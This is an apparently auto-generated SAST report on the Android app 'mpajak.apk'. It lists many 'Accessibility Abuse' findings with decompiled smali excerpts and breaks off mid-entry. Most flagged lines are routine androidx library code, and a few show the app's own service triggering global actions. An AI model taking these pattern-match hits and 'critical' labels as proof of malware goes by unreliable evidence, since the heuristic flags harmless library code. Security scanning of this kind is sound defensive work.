# 🚨 Security Findings (SAST)

**Analysis Date:** 2026-01-29 14:25:29

**APK:** mpajak.apk


[← Back to Main Report](./report.md)


---

### Summary

| Severity | Count |
|----------|-------|
| 🔴 Critical | 1134 |
| 🟠 High | 112 |
| 🟡 Medium | 96 |
| 🔵 Low | 0 |

**Total Findings:** 1342


## 🔴 CRITICAL Severity Findings


### Accessibility Abuse (187 issues)

**1. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/f3/i$a$a.smali`
- **Line:** 2

```java
.class public final Lf3/i$a$a;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;


```

**2. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/f3/i$a$a.smali`
- **Line:** 2

```java
.class public final Lf3/i$a$a;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;


```

**3. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/f3/i$a$a.smali`
- **Line:** 17

```java

# instance fields
.field public final synthetic a:Landroid/accessibilityservice/GestureDescription$StrokeDescription;


```

**4. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes20/androidx/appcompat/widget/ActionMenuView.smali`
- **Line:** 1071

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0

```

**5. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes20/androidx/appcompat/widget/ActionMenuView.smali`
- **Line:** 1071

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 0

```

**6. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes20/androidx/core/view/AccessibilityDelegateCompat$AccessibilityDelegateAdapter.smali`
- **Line:** 33

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1

```

**7. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes20/androidx/core/view/AccessibilityDelegateCompat$AccessibilityDelegateAdapter.smali`
- **Line:** 33

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1

```

**8. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes20/androidx/core/view/AccessibilityDelegateCompat$AccessibilityDelegateAdapter.smali`
- **Line:** 38

```java
    iget-object v0, p0, Landroidx/core/view/AccessibilityDelegateCompat$AccessibilityDelegateAdapter;->mCompat:Landroidx/core/view/AccessibilityDelegateCompat;

    invoke-virtual {v0, p1, p2}, Landroidx/core/view/AccessibilityDelegateCompat;->dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p1
```

**9. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/androidx/core/accessibilityservice/AccessibilityServiceInfoCompat.smali`
- **Line:** 1

```java
.class public final Landroidx/core/accessibilityservice/AccessibilityServiceInfoCompat;
.super Ljava/lang/Object;

```

**10. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/androidx/core/accessibilityservice/AccessibilityServiceInfoCompat.smali`
- **Line:** 1

```java
.class public final Landroidx/core/accessibilityservice/AccessibilityServiceInfoCompat;
.super Ljava/lang/Object;

```

**11. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes20/androidx/core/accessibilityservice/AccessibilityServiceInfoCompat.smali`
- **Line:** 245

```java
.end method

.method public static getCapabilities(Landroid/accessibilityservice/AccessibilityServiceInfo;)I
    .locals 0
    .param p0    # Landroid/accessibilityservice/AccessibilityServiceInfo;
```

**12. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes18/com/google/android/material/snackbar/BaseTransientBottomBar.smali`
- **Line:** 552

```java

    :cond_0
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityManager;->getEnabledAccessibilityServiceList(I)Ljava/util/List;

    move-result-object v0
```

**13. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes18/androidx/recyclerview/widget/LinearLayoutManager.smali`
- **Line:** 3711

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**14. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes18/androidx/recyclerview/widget/LinearLayoutManager.smali`
- **Line:** 3711

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**15. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes18/androidx/recyclerview/widget/LinearLayoutManager.smali`
- **Line:** 3714

```java
    .locals 1

    invoke-super {p0, p1}, Landroidx/recyclerview/widget/RecyclerView$LayoutManager;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-virtual {p0}, Landroidx/recyclerview/widget/RecyclerView$LayoutManager;->getChildCount()I
```

**16. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes18/androidx/drawerlayout/widget/DrawerLayout.smali`
- **Line:** 1814

```java
    const/16 v0, 0x20

    invoke-virtual {p1, v0}, Landroid/view/View;->sendAccessibilityEvent(I)V

    :cond_1
```

**17. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes18/androidx/drawerlayout/widget/DrawerLayout.smali`
- **Line:** 1879

```java
    const/16 p1, 0x20

    invoke-virtual {p0, p1}, Landroid/view/View;->sendAccessibilityEvent(I)V

    :cond_1
```

**18. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes16/androidx/appcompat/view/WindowCallbackWrapper.smali`
- **Line:** 88

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1

```

**19. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes16/androidx/appcompat/view/WindowCallbackWrapper.smali`
- **Line:** 88

```java
.end method

.method public dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1

```

**20. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes16/androidx/appcompat/view/WindowCallbackWrapper.smali`
- **Line:** 93

```java
    iget-object v0, p0, Landroidx/appcompat/view/WindowCallbackWrapper;->mWrapped:Landroid/view/Window$Callback;

    invoke-interface {v0, p1}, Landroid/view/Window$Callback;->dispatchPopulateAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result p1
```

**21. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/com/google/android/material/internal/NavigationMenuItemView.smali`
- **Line:** 480

```java
    const/16 v1, 0x800

    invoke-virtual {p1, v0, v1}, Landroidx/core/view/AccessibilityDelegateCompat;->sendAccessibilityEvent(Landroid/view/View;I)V

    :cond_0
```

**22. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/viewpager2/widget/ViewPager2$PageAwareAccessibilityProvider.smali`
- **Line:** 398

```java
.end method

.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**23. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/viewpager2/widget/ViewPager2$PageAwareAccessibilityProvider.smali`
- **Line:** 398

```java
.end method

.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**24. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/viewpager2/widget/ViewPager2$PageAwareAccessibilityProvider.smali`
- **Line:** 400

```java
.method public onRvInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**25. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/core/view/accessibility/AccessibilityEventCompat.smali`
- **Line:** 1

```java
.class public final Landroidx/core/view/accessibility/AccessibilityEventCompat;
.super Ljava/lang/Object;

```

**26. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/core/view/accessibility/AccessibilityEventCompat.smali`
- **Line:** 8

```java
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Landroidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl;,
        Landroidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl;,
        Landroidx/core/view/accessibility/AccessibilityEventCompat$ContentChangeType;
```

**27. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes17/androidx/core/view/accessibility/AccessibilityEventCompat.smali`
- **Line:** 9

```java
    value = {
        Landroidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl;,
        Landroidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl;,
        Landroidx/core/view/accessibility/AccessibilityEventCompat$ContentChangeType;
    }
```

**28. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes10/androidx/core/view/AccessibilityDelegateCompat.smali`
- **Line:** 199

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1
    .param p1    # Landroid/view/View;
```

**29. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes10/androidx/core/view/AccessibilityDelegateCompat.smali`
- **Line:** 199

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1
    .param p1    # Landroid/view/View;
```

**30. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes10/androidx/core/view/AccessibilityDelegateCompat.smali`
- **Line:** 205

```java
        .end annotation
    .end param
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**31. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/k1/a.smali`
- **Line:** 280

```java
.end method

.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**32. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/k1/a.smali`
- **Line:** 280

```java
.end method

.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
```

**33. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/k1/a.smali`
- **Line:** 282

```java
.method public final onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p1    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**34. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/androidx/core/view/accessibility/AccessibilityEventCompat$ContentChangeType.smali`
- **Line:** 1

```java
.class public interface abstract annotation Landroidx/core/view/accessibility/AccessibilityEventCompat$ContentChangeType;
.super Ljava/lang/Object;

```

**35. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/androidx/core/view/accessibility/AccessibilityEventCompat$ContentChangeType.smali`
- **Line:** 16

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/view/accessibility/AccessibilityEventCompat;
.end annotation

```

**36. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/androidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl.smali`
- **Line:** 1

```java
.class Landroidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl;
.super Ljava/lang/Object;

```

**37. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/androidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl.smali`
- **Line:** 11

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/view/accessibility/AccessibilityEventCompat;
.end annotation

```

**38. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes21/androidx/core/view/accessibility/AccessibilityEventCompat$Api19Impl.smali`
- **Line:** 29

```java
.end method

.method public static getContentChangeTypes(Landroid/view/accessibility/AccessibilityEvent;)I
    .locals 0
    .annotation build Landroidx/annotation/DoNotInline;
```

**39. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 1546

```java
    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v0, 0xc8
```

**40. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 1546

```java
    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v0, 0xc8
```

**41. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 1562

```java
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void
```

**42. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 1546

```java
    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v0, 0xc8
```

**43. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 1562

```java
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void
```

**44. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/c.smali`
- **Line:** 63

```java
    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;

    invoke-virtual {p1, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;
```

**45. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/c.smali`
- **Line:** 63

```java
    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;

    invoke-virtual {p1, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;
```

**46. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/f3/c.smali`
- **Line:** 80

```java
    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;

    invoke-virtual {p1, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**47. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes9/f3/c.smali`
- **Line:** 63

```java
    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;

    invoke-virtual {p1, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;
```

**48. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: performGlobalAction
- **File:** `smali_classes9/f3/c.smali`
- **Line:** 80

```java
    iget-object p1, p0, Lf3/c;->b:Lcom/superbock/auto/BaseService;

    invoke-virtual {p1, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
```

**49. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/customview/widget/ExploreByTouchHelper.smali`
- **Line:** 240

```java
.end method

.method private createEvent(II)Landroid/view/accessibility/AccessibilityEvent;
    .locals 1

```

**50. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/customview/widget/ExploreByTouchHelper.smali`
- **Line:** 247

```java
    if-eq p1, v0, :cond_0

    invoke-direct {p0, p1, p2}, Landroidx/customview/widget/ExploreByTouchHelper;->createEventForChild(II)Landroid/view/accessibility/AccessibilityEvent;

    move-result-object p1
```

**51. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/customview/widget/ExploreByTouchHelper.smali`
- **Line:** 254

```java

    :cond_0
    invoke-direct {p0, p2}, Landroidx/customview/widget/ExploreByTouchHelper;->createEventForHost(I)Landroid/view/accessibility/AccessibilityEvent;

    move-result-object p1
```

**52. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityManagerCompat.smali`
- **Line:** 68

```java
.end method

.method public static getEnabledAccessibilityServiceList(Landroid/view/accessibility/AccessibilityManager;I)Ljava/util/List;
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
```

**53. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityManagerCompat.smali`
- **Line:** 76

```java
            "I)",
            "Ljava/util/List<",
            "Landroid/accessibilityservice/AccessibilityServiceInfo;",
            ">;"
        }
```

**54. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityManagerCompat.smali`
- **Line:** 76

```java
            "I)",
            "Ljava/util/List<",
            "Landroid/accessibilityservice/AccessibilityServiceInfo;",
            ">;"
        }
```

**55. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl.smali`
- **Line:** 1

```java
.class Landroidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl;
.super Ljava/lang/Object;

```

**56. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl.smali`
- **Line:** 11

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/view/accessibility/AccessibilityEventCompat;
.end annotation

```

**57. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes9/androidx/core/view/accessibility/AccessibilityEventCompat$Api16Impl.smali`
- **Line:** 29

```java
.end method

.method public static getAction(Landroid/view/accessibility/AccessibilityEvent;)I
    .locals 0
    .annotation build Landroidx/annotation/DoNotInline;
```

**58. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/com/google/android/material/internal/CheckableImageButton$a.smali`
- **Line:** 33

```java

# virtual methods
.method public final onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
```

**59. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/com/google/android/material/internal/CheckableImageButton$a.smali`
- **Line:** 33

```java

# virtual methods
.method public final onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
```

**60. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/com/google/android/material/internal/CheckableImageButton$a.smali`
- **Line:** 35

```java
.method public final onInitializeAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**61. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/androidx/recyclerview/widget/StaggeredGridLayoutManager.smali`
- **Line:** 5675

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

```

**62. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/androidx/recyclerview/widget/StaggeredGridLayoutManager.smali`
- **Line:** 5675

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 2

```

**63. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes7/androidx/recyclerview/widget/StaggeredGridLayoutManager.smali`
- **Line:** 5678

```java
    .locals 2

    invoke-super {p0, p1}, Landroidx/recyclerview/widget/RecyclerView$LayoutManager;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    invoke-virtual {p0}, Landroidx/recyclerview/widget/RecyclerView$LayoutManager;->getChildCount()I
```

**64. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes6/androidx/core/view/accessibility/AccessibilityNodeProviderCompat.smali`
- **Line:** 102

```java
.end method

.method public findAccessibilityNodeInfosByText(Ljava/lang/String;I)Ljava/util/List;
    .locals 0
    .param p1    # Ljava/lang/String;
```

**65. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes24/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate$ItemDelegate.smali`
- **Line:** 54

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1
    .param p1    # Landroid/view/View;
```

**66. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes24/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate$ItemDelegate.smali`
- **Line:** 54

```java

# virtual methods
.method public dispatchPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)Z
    .locals 1
    .param p1    # Landroid/view/View;
```

**67. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes24/androidx/recyclerview/widget/RecyclerViewAccessibilityDelegate$ItemDelegate.smali`
- **Line:** 60

```java
        .end annotation
    .end param
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
```

**68. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes24/androidx/core/view/accessibility/AccessibilityNodeInfoCompat.smali`
- **Line:** 1216

```java
.end method

.method public findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
```

**69. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes24/androidx/core/view/accessibility/AccessibilityNodeInfoCompat.smali`
- **Line:** 1235

```java
    iget-object v1, p0, Landroidx/core/view/accessibility/AccessibilityNodeInfoCompat;->mInfo:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1, p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p1
```

**70. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: findAccessibilityNodeInfo
- **File:** `smali_classes24/androidx/core/view/accessibility/AccessibilityNodeInfoCompat.smali`
- **Line:** 1268

```java
.end method

.method public findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
```

**71. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes23/f3/k.smali`
- **Line:** 2

```java
.class public final Lf3/k;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;


```

**72. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes23/f3/k.smali`
- **Line:** 2

```java
.class public final Lf3/k;
.super Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;


```

**73. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityService
- **File:** `smali_classes23/f3/k.smali`
- **Line:** 6

```java

# instance fields
.field public final synthetic a:Landroid/accessibilityservice/GestureDescription$StrokeDescription;


```

**74. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/appcompat/widget/AppCompatButton.smali`
- **Line:** 466

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**75. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/appcompat/widget/AppCompatButton.smali`
- **Line:** 466

```java
.end method

.method public onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1

```

**76. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/appcompat/widget/AppCompatButton.smali`
- **Line:** 469

```java
    .locals 1

    invoke-super {p0, p1}, Landroid/view/View;->onInitializeAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    const-class v0, Landroid/widget/Button;
```

**77. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/recyclerview/widget/RecyclerView.smali`
- **Line:** 1455

```java
    if-eqz v1, :cond_0

    invoke-static {}, Landroid/view/accessibility/AccessibilityEvent;->obtain()Landroid/view/accessibility/AccessibilityEvent;

    move-result-object v1
```

**78. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/recyclerview/widget/RecyclerView.smali`
- **Line:** 1455

```java
    if-eqz v1, :cond_0

    invoke-static {}, Landroid/view/accessibility/AccessibilityEvent;->obtain()Landroid/view/accessibility/AccessibilityEvent;

    move-result-object v1
```

**79. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes23/androidx/recyclerview/widget/RecyclerView.smali`
- **Line:** 1461

```java
    const/16 v2, 0x800

    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityEvent;->setEventType(I)V

    invoke-static {v1, v0}, Landroidx/core/view/accessibility/AccessibilityEventCompat;->setContentChangeTypes(Landroid/view/accessibility/AccessibilityEvent;I)V
```

**80. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes15/com/google/android/material/internal/CheckableImageButton.smali`
- **Line:** 180

```java
    const/4 p1, 0x0

    invoke-virtual {p0, p1}, Landroid/view/View;->sendAccessibilityEvent(I)V

    :cond_0
```

**81. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes15/com/google/android/material/internal/CheckableImageButton.smali`
- **Line:** 203

```java
    const/16 p1, 0x800

    invoke-virtual {p0, p1}, Landroid/view/View;->sendAccessibilityEvent(I)V

    :cond_0
```

**82. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes15/com/google/android/material/textfield/b$d.smali`
- **Line:** 79

```java
.end method

.method public final onPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
```

**83. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes15/com/google/android/material/textfield/b$d.smali`
- **Line:** 79

```java
.end method

.method public final onPopulateAccessibilityEvent(Landroid/view/View;Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 1
    .param p2    # Landroid/view/accessibility/AccessibilityEvent;
```

**84. Accessibility Abuse Detected**
- **Description:** Suspicious pattern found: AccessibilityEvent
- **File:** `smali_classes15/com/google/android/material/textfield/b$d.smali`
